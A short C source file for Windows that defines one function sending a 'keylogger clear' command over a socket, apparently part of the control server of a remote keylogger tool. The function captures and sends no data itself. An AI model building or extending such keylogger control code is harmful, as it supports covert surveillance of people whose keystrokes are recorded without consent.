#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include "net/commands.h"
#include "net/interface.h"
#include "logger.h"
#include "server.h"
#include "types.h"

int net_cmd_kl_Clear(char* msg, int msgLen, SOCKET sock)
{
	net_formatCmd(&msg, &msgLen, NET_CMD_KEYLOGGER_CLEAR);
	net_makeToRawCmd(NET_CMD_KEYLOGGER_CLEAR, &msg, &msgLen);

	if(net_SendData(sock, msg, msgLen) < 1)
	{
		return -2;
	}
	
	return 1;
}